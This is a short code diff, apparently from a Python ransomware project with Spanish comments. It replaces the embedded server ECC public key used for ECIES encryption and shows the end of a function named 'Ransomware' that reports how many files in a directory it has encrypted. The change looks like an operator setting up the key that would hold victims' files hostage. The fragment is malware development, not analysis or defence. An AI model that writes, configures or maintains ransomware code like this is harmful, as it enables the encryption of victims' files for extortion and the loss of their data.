@@ -36,8 +36,8 @@ ECIES_VERSION = 1       # Versión del blob ECIES
 
 # Clave pública ECC del servidor (PEM)
 PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
-MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEgmBlREjfH2x3683dyOZii4olhCsr
-Hm78xilMiU5Mnp3xquB7xXp964hJBTajhk1mA+FgET6aGY7rgTMiPrSwrQ==
+MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEvv915Q1SWQ+K5D5+Eq69r75iyoH6
+52e1sNf8DOl0PX36ZYnlDnZ14ljSLoI3C26wO/qHzQELJhUvHsSnQhjgqQ==
 -----END PUBLIC KEY-----"""
 
 
@@ -360,3 +360,4 @@ def Ransomware(directory_path, client):
 
     logger.info(f"Proceso completado. Total archivos cifrados: {count}")
     return count
+
